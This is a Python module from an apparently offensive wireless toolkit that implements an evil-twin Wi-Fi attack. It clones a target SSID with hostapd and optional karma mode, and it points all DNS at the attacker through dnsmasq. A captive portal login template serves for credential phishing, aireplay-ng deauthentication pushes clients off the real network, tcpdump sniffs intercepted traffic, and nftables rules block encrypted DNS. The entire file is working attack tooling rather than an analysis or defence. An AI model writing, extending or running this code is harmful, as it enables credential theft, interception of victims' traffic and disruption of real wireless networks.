import asyncio
import os
import re
import sys
from typing import Any, Optional, Dict
from wcarck.core.module import Module
from wcarck.core.event_bus import bus
from wcarck.hardware.process import ManagedProcess
from wcarck.orchestration.leases import RadioLeaseManager
import structlog

logger = structlog.get_logger()

class DHCPServer:
    def __init__(self, iface: str, base_ip: str, job_id: str):
        self.iface = iface
        self.base_ip = base_ip
        self.job_id = job_id
        self._process: Optional[ManagedProcess] = None
        self.conf_path = f"/tmp/wcarck_dnsmasq_{job_id}.conf"

    async def write_config(self, dns_spoofing: bool = True):
        with open(self.conf_path, 'w') as f:
            f.write(f"interface={self.iface}\n")
            f.write(f"dhcp-range={self.base_ip}.10,{self.base_ip}.100,12h\n")
            f.write(f"dhcp-option=3,{self.base_ip}.1\n")
            f.write(f"dhcp-option=6,{self.base_ip}.1\n")
            f.write("dhcp-lease-max=50\n")
            if dns_spoofing:
                f.write(f"address=/#/{self.base_ip}.1\n")
                f.write(f"address=/#/::\n")

    async def start(self):
        cmd = ["dnsmasq", "-C", self.conf_path, "-d", "--no-daemon"]
        self._process = ManagedProcess(cmd=cmd, job_id=self.job_id)
        await self._process.start()

    async def stop(self):
        if self._process:
            await self._process.stop()
            self._process = None

    def is_running(self) -> bool:
        return self._process is not None and self._process._process is not None


class CaptivePortal:
    def __init__(self, template: str, job_id: str):
        self.template = template
        self.job_id = job_id
        self._process: Optional[ManagedProcess] = None

    async def start(self):
        portal_script = os.path.join(os.path.dirname(__file__), "captive_portal.py")
        cmd = [sys.executable, portal_script, "--template", self.template, "--job_id", self.job_id]
        self._process = ManagedProcess(cmd=cmd, job_id=self.job_id)
        await self._process.start()

    async def stop(self):
        if self._process:
            await self._process.stop()
            self._process = None

    def is_running(self) -> bool:
        return self._process is not None and self._process._process is not None


class HostAP:
    def __init__(self, iface: str, ssid: str, channel: int, encryption: str, job_id: str):
        self.iface = iface
        self.ssid = ssid
        self.channel = channel
        self.encryption = encryption
        self.job_id = job_id
        self.passphrase = "password123" # Will be overwritten by start params if provided
        self._process: Optional[ManagedProcess] = None
        self.conf_path = f"/tmp/wcarck_hostapd_{job_id}.conf"

    async def write_config(self, karma_mode: bool = False):
        with open(self.conf_path, 'w') as f:
            f.write(f"interface={self.iface}\n")
            f.write(f"ssid={self.ssid}\n")
            f.write(f"channel={self.channel}\n")
            f.write("hw_mode=g\n")
            f.write("ieee8021x=0\n")
            if self.encryption == "open":
                f.write("wpa_key_mgmt=NONE\n")

            if self.encryption == "wpa2":
                f.write("wpa=2\n")
                f.write(f"wpa_passphrase={self.passphrase}\n")
                f.write("wpa_key_mgmt=WPA-PSK\n")
                f.write("rsn_pairwise=CCMP\n")
            elif self.encryption == "wpa3":
                f.write("wpa=2\n")
                f.write("wpa_key_mgmt=SAE\n")
                f.write("rsn_pairwise=CCMP\n")
                f.write(f"sae_password={self.passphrase}\n")

            if karma_mode:
                f.write("mana_karma=1\n")
                f.write("enable_karma=1\n")

    async def start(self):
        cmd = ["hostapd", self.conf_path]
        self._process = ManagedProcess(cmd=cmd, job_id=self.job_id)
        await self._process.start()

    async def stop(self):
        if self._process:
            await self._process.stop()
            self._process = None

    def is_running(self) -> bool:
        return self._process is not None and self._process._process is not None


class EvilTwinModule(Module):
    """
    Active 802.11 Evil Twin Module.
    Acquires an ap.service lease, runs hostapd for the fake AP,
    dnsmasq for DHCP/DNS spoofing, and a FastAPI web server for the captive portal.
    """

    def __init__(self, lease_manager: RadioLeaseManager):
        self.lease_manager = lease_manager
        self._hostap: Optional[HostAP] = None
        self._dhcp: Optional[DHCPServer] = None
        self._portal: Optional[CaptivePortal] = None
        self._deauth_process: Optional[ManagedProcess] = None
        self._mitm_process: Optional[ManagedProcess] = None

    @property
    def name(self) -> str:
        return "attack.eviltwin"

    async def start(self, job_id: str, params: dict[str, Any]) -> None:
        iface = params.get("iface", "wlan_ap")
        ssid = params.get("ssid")
        channel = params.get("channel", 6)
        template = params.get("template", "Login_v4")

        if not ssid:
            raise ValueError("Target SSID is required for Evil Twin")

        encryption = params.get("encryption", "open")
        karma_mode = params.get("karma_mode", False)
        dns_spoofing = params.get("dns_spoofing", True)
        mitm_enabled = params.get("mitm_enabled", False)
        deauth_companion = params.get("deauth_companion", "never")
        target_bssid = params.get("bssid")
        passphrase = params.get("passphrase", "password123")

        self.iface = iface
        await self.lease_manager.acquire(job_id, iface, "ap.service")

        base_ip = "10.0.0"
        if os.name == 'posix':
            try:
                proc = await asyncio.create_subprocess_exec(
                    "ip", "-4", "addr", "show", "wlan_uplink",
                    stdout=asyncio.subprocess.PIPE
                )
                stdout, _ = await proc.communicate()
                if b"10.0.0." in stdout:
                    base_ip = "172.16.0"

                await asyncio.create_subprocess_exec("sudo", "ip", "addr", "flush", "dev", iface)
                await asyncio.create_subprocess_exec("sudo", "ip", "addr", "add", f"{base_ip}.1/24", "dev", iface)
                await asyncio.create_subprocess_exec("sudo", "ip", "link", "set", iface, "up")

                ss_proc = await asyncio.create_subprocess_exec("ss", "-uln", stdout=asyncio.subprocess.PIPE)
                ss_out, _ = await ss_proc.communicate()
                if b":53 " in ss_out:
                    await asyncio.create_subprocess_exec("sudo", "systemctl", "stop", "systemd-resolved")
            except Exception as e:
                logger.error(f"Failed to assign IP or handle port collision: {e}")

        self._hostap = HostAP(iface, ssid, channel, encryption, job_id)
        self._hostap.passphrase = passphrase
        await self._hostap.write_config(karma_mode)

        self._dhcp = DHCPServer(iface, base_ip, job_id)
        await self._dhcp.write_config(dns_spoofing)

        self._portal = CaptivePortal(template, job_id)

        if os.name == 'posix':
            try:
                await asyncio.create_subprocess_exec(
                    "sudo", "nft", "add", "rule", "inet", "filter", "forward",
                    "iifname", iface, "meta", "nfproto", "ipv6", "drop"
                )
                await asyncio.create_subprocess_exec(
                    "sudo", "nft", "add", "rule", "inet", "filter", "forward",
                    "iifname", iface, "tcp", "dport", "853", "reject"
                )
                await asyncio.create_subprocess_exec(
                    "sudo", "nft", "add", "rule", "inet", "filter", "forward",
                    "iifname", iface, "udp", "dport", "853", "reject"
                )
            except Exception as e:
                logger.error(f"Failed to apply nftables isolation: {e}")

        if os.name == 'nt':
            self._hostap._process = ManagedProcess(
                cmd=["python", "-c", f"import time; print('Fake AP {ssid} started...'); time.sleep(60)"],
                job_id=job_id
            )
            self._dhcp._process = ManagedProcess(
                cmd=["python", "-c", "import time; print('DNS/DHCP started...'); time.sleep(60)"],
                job_id=job_id
            )
            self._portal._process = ManagedProcess(
                cmd=["python", "-c", f"import time; print('Captive Portal {template} started...'); time.sleep(60)"],
                job_id=job_id
            )
            await self._hostap._process.start()
            await self._dhcp._process.start()
            await self._portal._process.start()
        else:
            await self._hostap.start()
            await self._dhcp.start()
            await self._portal.start()

        self._deauth_process = None
        if deauth_companion != "never" and target_bssid:
            logger.info(f"Starting Deauth Companion ({deauth_companion}) against {target_bssid}")
            d_count = "0" if deauth_companion == "continuous" else "10"
            if os.name == 'posix':
                c_cmd = ["aireplay-ng", "-0", d_count, "-a", target_bssid, iface]
            else:
                c_cmd = ["python", "-c", f"import time; print('Deauth companion started against {target_bssid}'); time.sleep(60)"]
            self._deauth_process = ManagedProcess(cmd=c_cmd, job_id=f"{job_id}_deauth")
            await self._deauth_process.start()

        self._mitm_process = None
        if mitm_enabled:
            logger.info(f"Starting MITM sniffer on {iface}")
            if os.name == 'posix':
                m_cmd = ["tcpdump", "-i", iface, "-A", "-l",
                         "not", "port", "22", "and", "not", "port", "853",
                         "and", "not", "arp"]
            else:
                m_cmd = ["python", "-c",
                         "import time; print('MITM sniffer started (mock)'); time.sleep(60)"]
            self._mitm_process = ManagedProcess(cmd=m_cmd, job_id=f"{job_id}_mitm")
            await self._mitm_process.start()

        bus.publish("module.started", {"job_id": job_id, "module": self.name})

    async def stop(self, job_id: str) -> None:
        try:
            if self._hostap:
                try:
                    await self._hostap.stop()
                except Exception as e:
                    logger.error(f"EvilTwin stop hostap error: {e}")
            if self._dhcp:
                try:
                    await self._dhcp.stop()
                except Exception as e:
                    logger.error(f"EvilTwin stop dhcp error: {e}")
            if self._portal:
                try:
                    await self._portal.stop()
                except Exception as e:
                    logger.error(f"EvilTwin stop portal error: {e}")
            if self._deauth_process:
                try:
                    await self._deauth_process.stop()
                except Exception as e:
                    logger.error(f"EvilTwin stop deauth error: {e}")
                self._deauth_process = None
            if self._mitm_process:
                try:
                    await self._mitm_process.stop()
                except Exception as e:
                    logger.error(f"EvilTwin stop mitm error: {e}")
                self._mitm_process = None
        finally:
            if getattr(self, 'iface', None):
                await self.lease_manager.release(job_id, self.iface)

        if os.name == 'posix' and getattr(self, 'iface', None):
            try:
                iface = self.iface
                proc = await asyncio.create_subprocess_exec(
                    "sudo", "nft", "list", "ruleset", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
                )
                stdout, _ = await proc.communicate()
                ruleset = stdout.decode()
                
                if iface in ruleset:
                    list_proc = await asyncio.create_subprocess_exec(
                        "sudo", "nft", "-a", "list", "ruleset", stdout=asyncio.subprocess.PIPE
                    )
                    list_out, _ = await list_proc.communicate()
                    for line in list_out.decode().splitlines():
                        if iface in line and ("drop" in line or "reject" in line):
                            handle_match = re.search(r'# handle (\d+)', line)
                            if handle_match:
                                handle = handle_match.group(1)
                                try:
                                    await asyncio.create_subprocess_exec("sudo", "nft", "delete", "rule", "inet", "filter", "forward", "handle", handle)
                                except Exception:
                                    pass
            except Exception as e:
                logger.error(f"Failed to clean nftables rules: {e}")

            # Flush IP assignment and restart systemd-resolved
            try:
                iface = self.iface
                await asyncio.create_subprocess_exec("sudo", "ip", "addr", "flush", "dev", iface)
            except Exception as e:
                logger.error(f"Failed to flush IP on {self.iface}: {e}")
            try:
                await asyncio.create_subprocess_exec("sudo", "systemctl", "start", "systemd-resolved")
            except Exception as e:
                logger.error(f"Failed to restart systemd-resolved: {e}")

        bus.publish("module.stopped", {"job_id": job_id, "module": self.name})

    async def status(self, job_id: str) -> dict[str, Any]:
        connected = 0
        dhcp_leases = 0
        if os.name == 'posix' and getattr(self, 'iface', None):
            try:
                h_proc = await asyncio.create_subprocess_exec(
                    "sudo", "hostapd_cli", "-i", self.iface, "all_sta",
                    stdout=asyncio.subprocess.PIPE
                )
                h_out, _ = await h_proc.communicate()
                connected = h_out.decode().count("dot11RSNAStatsSTAAddress")

                lease_file = "/var/lib/misc/dnsmasq.leases"
                if os.path.exists(lease_file):
                    with open(lease_file) as f:
                        dhcp_leases = len([line for line in f if line.strip()])
            except Exception:
                pass

        return {
            "is_running": self._hostap is not None and self._hostap.is_running(),
            "module": self.name,
            "connected": connected,
            "dhcp_leases": dhcp_leases,
            "dhcp_running": self._dhcp is not None and self._dhcp.is_running(),
            "dns_running": self._dhcp is not None and self._dhcp.is_running(),
            "portal_running": self._portal is not None and self._portal.is_running(),
        }
